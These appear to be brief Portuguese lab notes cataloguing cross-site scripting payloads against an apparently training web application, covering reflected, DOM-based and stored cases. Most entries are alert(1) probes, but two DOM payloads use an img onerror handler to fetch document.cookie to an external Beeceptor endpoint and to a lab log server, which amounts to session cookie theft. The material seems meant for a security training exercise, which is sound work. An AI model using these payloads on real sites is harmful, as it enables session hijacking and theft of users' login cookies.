- Reflected
    - /hello?nome=Teste<script>alert(1)</script> **(Precisa estar autenticado via cookie)**
- DOM
    - Filtro na listagem de POSTS
    - ?filtro=%3Cimg%20src=%22a%22%20onerror=%22alert(1)%22%20/%3E
    ```html
    <img src="a" onerror="alert(1)" />busca
    ```
    - Enviar cookie Beeceptor (Externo)
    ```sh
    yea<img src="a" onerror="fetch('https://teste-crescer-cwi.free.beeceptor.com?cookie'%2bdocument.cookie)" />
    ```
    - Enviar cookie Log Server (Local)
    ```
    <img src="a" onerror="fetch('https://log.crescer.lab?cookie='%2Bdocument.cookie)" >
    ```
- Stored
    - Comentários dos posts
    ```html
    <img src="a" onerror="alert(1)" />comentário
    ```